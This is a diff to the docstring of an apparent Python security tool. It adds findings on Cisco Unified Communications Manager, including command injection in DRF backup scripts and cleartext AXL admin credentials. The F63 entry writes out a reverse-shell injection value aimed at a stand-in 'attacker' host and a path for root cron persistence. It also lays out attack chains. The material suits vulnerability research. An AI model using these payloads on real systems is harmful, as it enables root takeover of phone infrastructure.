@@ -755,9 +755,24 @@ CUCM-F60 MEDIUM: CCMEncryption.jar setStaticKey() public static override bypasse
   Wire format confirmed: IV(16 bytes, random NativePRNGNonBlocking) || AES-128-CBC-PKCS5(ciphertext)
   dkey.txt write path predictable: if writable (F41/F53 chains), plant known key → all future encryptions use attacker-known AES-256
   Chains: F3 (root static key), F41 (Redis write dkey.txt+dkey_status.txt), F53 (world-writable sshd_config chain)
+
+CUCM-F63 CRITICAL: DRF backup/restore scripts -- unsanitized os.system() + sudo tar on user-controlled args -> root RCE
+  Components: cm-syslog: do_backup.py/do_restore.py/do_syslog_restore.py; cm-tct-svc: tct_do_backup.py/tct_do_restore.py
+  Pattern: DEVICE_TARBALL + DEC_SEQ + " | sudo /bin/tar -xvpPf - 1>> " + LOGFILE -> 3 injection points
+  All values from sys.argv (admin backup config: SFTP path, encryption sequence, log path) -> os.system() unsanitized
+  DEC_SEQ="; bash -i &>/dev/tcp/attacker/443 <&1 #" -> root reverse shell via sudo tar pipe
+  LOGFILE="/etc/cron.d/backdoor" -> root cron persistence via tar stdout redirect
+  Chain: admin auth (F1/F7) -> DRF backup schedule config -> sudo root RCE
+
+CUCM-F64 MEDIUM: axl.war transport-guarantee=NONE - AXL SOAP admin credentials in cleartext HTTP
+  Component: cm-axl RPM / usr/local/cm/war/axl.war WEB-INF/web.xml
+  <transport-guarantee>NONE</transport-guarantee> on /axl + /services/AXLAPIService (GET+POST)
+  AXL uses HTTP Basic Auth (base64 in Authorization header) -- no HTTPS enforcement
+  No HTTPS enforcement -> admin creds + full provisioning payload (users, phones, dial plans) in cleartext
+  Chains: F37 (ccmivr SQLi), F61 (Struts RCE), F63 (DRF injection) all require admin auth - AXL interception provides it
 """
 
-VERSION = "3.16.0"
+VERSION = "3.17.0"
 
 import requests
 import urllib3
